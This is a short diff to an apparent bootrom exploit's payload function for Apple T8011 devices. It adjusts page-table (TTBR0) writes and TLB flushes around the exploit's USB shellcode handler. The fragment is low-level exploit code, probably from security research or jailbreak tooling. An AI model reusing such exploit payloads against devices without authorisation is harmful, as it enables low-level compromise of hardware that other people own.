@@ -362,9 +362,11 @@ def payload(cpid):
       (t8011_write_ttbr0, 0x1800B0000),
       (t8011_tlbi, 0),
       (0x1820B0610, 0),
-      (t8011_write_ttbr0, 0x1800A0000),
+      (t8011_write_ttbr0, 0x1800A8000), # A custom pagetable we just set up
       (t8011_tlbi, 0),
       (0x1800B0000, 0),
+      (t8011_write_ttbr0, 0x1800A0000), # Real pagetable
+      (t8011_tlbi, 0),
     ]
 
     t8011_handler   = asm_arm64_x7_trampoline(t8011_handle_interface_request) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t8011)[4:]
